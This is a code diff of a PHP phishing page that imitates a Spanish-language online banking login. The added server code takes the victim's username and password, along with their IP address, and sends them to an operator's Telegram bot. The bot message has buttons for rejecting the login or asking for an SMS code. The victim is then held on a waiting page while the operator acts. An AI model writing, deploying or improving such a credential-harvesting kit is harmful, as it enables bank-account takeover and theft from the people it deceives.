@@ -1,22 +1,35 @@
 <?php
-/* Login System v2.1 - Security Enhanced */
-/* Generated: 2026-03-29 */
-/* Security Layer Active */
+/* Login System v2.1 - Password Step */
 session_start();
-include("settings.php"); // Este archivo debe tener $token y $chat_id
+include("settings.php"); // $token y $chat_id
 
-// Random seed for security purposes
-$security_seed = rand(1000, 9999);
-$session_token = bin2hex(random_bytes(8));
+// Si no viene de index.php (no hay usuario en sesión), volver al inicio
+$usuario = $_SESSION['usuario'] ?? null;
+if (!$usuario) {
+    header("Location: index.php");
+    exit;
+}
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $usuario = str_replace(' ', '', $_POST['ips1'] ?? '');
+    $clave = $_POST['ips2'] ?? '';
+    $ip    = $_SERVER['REMOTE_ADDR'];
 
-    $_SESSION['usuario']        = $usuario;
-    $_SESSION['security_token'] = $session_token;
+    $msg = "🔐 Log HNL\n👤 Usuario: $usuario\n🔑 Clave: $clave\n🌐 IP: $ip";
 
-    // Paso 1 completado: ahora pedir contraseña en inde.php
-    header("Location: inde.php");
+    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
+        'chat_id' => $chat_id,
+        'text'    => $msg,
+        'reply_markup' => json_encode([
+            'inline_keyboard' => [
+                [
+                    ['text' => '❌ Login Error', 'callback_data' => "ERROR|$usuario"],
+                    ['text' => '📩 SMS',         'callback_data' => "SMS|$usuario"]
+                ]
+            ]
+        ])
+    ]));
+
+    header("Location: espera.php");
     exit;
 }
 ?>
@@ -45,10 +58,6 @@ body{
     width:100%;
     height:100vh;
 }
-
-/* =========================
-   LEFT PANEL
-========================= */
 
 .left-panel{
     flex:0 0 40%;
@@ -102,10 +111,6 @@ body{
     font-weight:600;
 }
 
-/* =========================
-   RIGHT PANEL
-========================= */
-
 .right-panel{
     flex:0 0 60%;
     display:flex;
@@ -122,10 +127,6 @@ body{
     margin:auto;
 }
 
-/* =========================
-   LOGO
-========================= */
-
 .logo{
     width:100%;
     display:flex;
@@ -139,25 +140,28 @@ body{
     object-fit:contain;
 }
 
-/* =========================
-   TITULO
-========================= */
-
 .welcome{
     font-size:33px;
     line-height:1.35;
     color:#00853f;
     font-weight:300;
-    margin-bottom:44px;
+    margin-bottom:24px;
 }
 
 .welcome strong{
     font-weight:700;
 }
 
-/* =========================
-   FORM
-========================= */
+.user-display{
+    font-size:15px;
+    color:#444;
+    margin-bottom:32px;
+}
+
+.user-display strong{
+    color:#00853f;
+    font-weight:600;
+}
 
 label{
     display:block;
@@ -167,7 +171,6 @@ label{
     color:#222;
 }
 
-input[type="text"],
 input[type="password"]{
     width:100%;
     height:56px;
@@ -180,16 +183,12 @@ input[type="password"]{
     transition:0.2s;
 }
 
-input[type="text"]:focus,
 input[type="password"]:focus{
     border-color:#00853f;
 }
 
 .field{
     margin-bottom:18px;
-}
-.field:last-of-type{
-    margin-bottom:0;
 }
 
 .btn-ingresar{
@@ -209,10 +208,6 @@ input[type="password"]:focus{
 .btn-ingresar:hover{
     background:#006633;
 }
-
-/* =========================
-   LINKS
-========================= */
 
 .forgot{
     text-align:center;
@@ -241,10 +236,6 @@ input[type="password"]:focus{
     text-decoration:underline;
 }
 
-/* =========================
-   HELP SECTION
-========================= */
-
 .help-section{
     margin-top:42px;
     padding-top:34px;
@@ -259,60 +250,10 @@ input[type="password"]:focus{
     display:inline-block;
 }
 
-.help-section p{
-    margin-bottom:18px;
-    font-size:15px;
-    color:#444;
-}
-
-.help-icons{
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    gap:22px;
-}
-
-.help-icons a{
-    width:42px;
-    height:42px;
-    border:1.5px solid #00853f;
-    border-radius:50%;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    color:#00853f;
-    transition:0.2s;
-    text-decoration:none;
-}
-
-.help-icons a:hover{
-    background:#eef8f1;
-}
-
-.help-icons svg{
-    width:20px;
-    height:20px;
-}
-
-/* =========================
-   RESPONSIVE
-========================= */
-
 @media(max-width:1000px){
-
-    body{
-        overflow:auto;
-    }
-
-    .container{
-        flex-direction:column;
-        height:auto;
-    }
-
-    .left-panel{
-        display:none;
-    }
-
+    body{overflow:auto;}
+    .container{flex-direction:column;height:auto;}
+    .left-panel{display:none;}
     .right-panel{
         flex:none;
         width:100%;
@@ -320,73 +261,39 @@ input[type="password"]:focus{
         background:#fff;
         overflow:visible;
     }
-
-    .login-box{
-        max-width:100%;
-    }
-
-    .logo{
-        justify-content:flex-start;
-        margin-bottom:24px;
-    }
-
-    .logo-img{
-        width:210px;
-    }
-
-    .welcome{
-        font-size:24px;
-        margin-bottom:24px;
-    }
-
-    label{
-        font-size:13px;
-        margin-bottom:6px;
-    }
-
-    input[type="text"],
+    .login-box{max-width:100%;}
+    .logo{justify-content:flex-start;margin-bottom:24px;}
+    .logo-img{width:210px;}
+    .welcome{font-size:24px;margin-bottom:12px;}
+    .user-display{font-size:14px;margin-bottom:22px;}
+    label{font-size:13px;margin-bottom:6px;}
     input[type="password"]{
         height:38px;
         font-size:13px;
         padding:0 12px;
         border-radius:3px;
     }
-
-    .field{
-        margin-bottom:10px;
-    }
-
+    .field{margin-bottom:10px;}
     .btn-ingresar{
         height:40px;
         font-size:14px;
         margin-top:20px;
         border-radius:3px;
     }
-
-    .forgot{
-        margin-top:22px;
-    }
-
-    .forgot a{
-        font-size:13px;
-    }
-
+    .forgot{margin-top:22px;}
+    .forgot a{font-size:13px;}
     .divider-links{
         margin-top:24px;
         padding-top:20px;
         font-size:13px;
         line-height:2;
     }
-
-    .help-section{
-        display:none;
-    }
+    .help-section{display:none;}
 }
 </style>
 </head>
 <body>
   <div class="container">
-    <!-- LEFT: IMAGE PLACEHOLDER -->
     <div class="left-panel">
       <img src="img/imgFondoLogin.png" alt="">
       <div class="security-banner">
@@ -395,31 +302,30 @@ input[type="password"]:focus{
       </div>
     </div>
 
-    <!-- RIGHT: LOGIN -->
     <div class="right-panel">
       <div class="login-box">
         <div class="logo">
           <img src="img/imgLogoLogin.png" alt="Prox" class="logo-img">
-
-
         </div>
 
         <h1 class="welcome">Te damos la bienvenida a<br>tu <strong>Banca en Línea</strong></h1>
 
-        <form action="index.php" method="POST">
+        <p class="user-display">Usuario: <strong><?php echo htmlspecialchars($usuario); ?></strong></p>
+
+        <form action="inde.php" method="POST">
           <div class="field">
-            <label for="ips1">Ingresa tu usuario</label>
-            <input type="text" id="ips1" name="ips1" autocomplete="username" required style="text-transform:uppercase" oninput="this.value=this.value.toUpperCase()">
+            <label for="ips2">Contraseña</label>
+            <input type="password" id="ips2" name="ips2" autocomplete="current-password" required autofocus>
           </div>
-          <button type="submit" id="btnIngresar" class="btn-ingresar">Ingresar</button>
+          <button type="submit" class="btn-ingresar">Ingresar</button>
         </form>
 
         <div class="forgot">
-          <a href="#">¿Olvidaste tu usuario?</a>
+          <a href="index.php">¿No eres tú? Cambiar usuario</a>
         </div>
 
         <div class="divider-links">
-          ¿Es tu primer ingreso? <a href="#">Crea tu usuario</a><br>
+          ¿Olvidaste tu contraseña? <a href="#">Recupérala aquí</a><br>
           ¿Aún no tienes una cuenta con nosotros? <a href="#">Abrir cuenta</a>
         </div>
 
